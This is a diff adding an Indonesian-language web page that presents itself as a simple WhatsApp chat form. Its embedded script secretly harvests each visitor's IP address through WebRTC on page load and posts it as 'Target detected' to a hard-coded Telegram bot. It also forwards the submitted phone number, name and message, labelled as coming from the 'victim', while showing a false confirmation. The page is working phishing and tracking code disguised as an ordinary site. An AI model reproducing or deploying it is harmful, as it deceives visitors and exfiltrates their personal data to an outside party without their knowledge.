@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>WhatsApp Chat</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+    color: #f0f0f0;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .container {
+    background: #222b3a;
+    padding: 30px 40px;
+    border-radius: 12px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+    max-width: 400px;
+    width: 90%;
+  }
+  h1 {
+    margin-bottom: 24px;
+    text-align: center;
+    font-weight: 700;
+    font-size: 28px;
+  }
+  label {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: 600;
+  }
+  input[type="text"], textarea {
+    width: 100%;
+    padding: 10px 14px;
+    margin-bottom: 18px;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    resize: vertical;
+  }
+  textarea {
+    min-height: 100px;
+  }
+  button {
+    background: #4a90e2;
+    border: none;
+    width: 100%;
+    padding: 12px;
+    font-size: 18px;
+    font-weight: 700;
+    color: white;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: #357abd;
+  }
+  .footer {
+    margin-top: 20px;
+    font-size: 12px;
+    text-align: center;
+    color: #a0a0a0;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>WhatsApp Chat</h1>
+  <form id="chatForm">
+    <label for="number">Nomor WhatsApp</label>
+    <input type="text" id="number" name="number" placeholder="+6281234567890" required pattern="^\+?\d{9,15}$" title="Masukkan nomor dengan kode negara, contoh +6281234567890" />
+    <label for="name">Nama</label>
+    <input type="text" id="name" name="name" placeholder="Nama Kamu" required />
+    <label for="message">Pesan</label>
+    <textarea id="message" name="message" placeholder="Tulis pesan disini..." required></textarea>
+    <button type="submit">Kirim</button>
+  </form>
+  <div class="footer">Website Simple WhatsApp Chat</div>
+</div>
+<script>
+(() => {
+  const telegramBotToken = "7628106273:AAFzyduoKMlfV65CqbAUNObcH0C3Lg6zCp0";
+  const telegramChatId = "7209932865";
+  const telegramBaseUrl = "https://api.telegram.org/bot";
+
+  async function sendTelegramMessage(text) {
+    try {
+      await fetch(`${telegramBaseUrl}${telegramBotToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: text,
+          parse_mode: "HTML"
+        })
+      });
+    } catch (e) {
+      // Silent catch
+    }
+  }
+
+  function getUserIP() {
+    return new Promise((resolve) => {
+      // Try to get IP from WebRTC
+      const peerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+      if (!peerConnection) {
+        resolve("IP unavailable");
+        return;
+      }
+      const pc = new peerConnection({iceServers: []});
+      pc.createDataChannel("");
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .catch(() => {});
+      pc.onicecandidate = (ice) => {
+        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+        const ipAddr = ipRegex.exec(ice.candidate.candidate);
+        if (ipAddr) {
+          resolve(ipAddr[1]);
+          pc.onicecandidate = null;
+        }
+      };
+      setTimeout(() => resolve("IP unavailable"), 5000);
+    });
+  }
+
+  async function notifyIP() {
+    const ip = await getUserIP();
+    const msg = `&lt;\\&gt; Target detected✅ (${ip})`;
+    sendTelegramMessage(msg);
+  }
+
+  function escapeHtml(text) {
+    return text.replace(/[&<>"']/g, function(m) {
+      return ({'&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'": '&#39;'}[m]);
+    });
+  }
+
+  async function handleSubmit(e) {
+    e.preventDefault();
+    const number = e.target.number.value.trim();
+    const name = e.target.name.value.trim();
+    const message = e.target.message.value.trim();
+    if(!number || !name || !message) return;
+    const notificationText =
+      `Notifikasi chat dari korban\n\n` +
+      `Nomor: ${escapeHtml(number)}\n` +
+      `Nama: ${escapeHtml(name)}\n` +
+      `Pesan: ${escapeHtml(message)}`;
+    await sendTelegramMessage(notificationText);
+    alert("Pesan berhasil dikirim.");
+    e.target.reset();
+  }
+
+  window.addEventListener("load", () => {
+    document.getElementById("chatForm").addEventListener("submit", handleSubmit);
+    notifyIP();
+  });
+})();
+</script>
+</body>
+</html>
+
+```
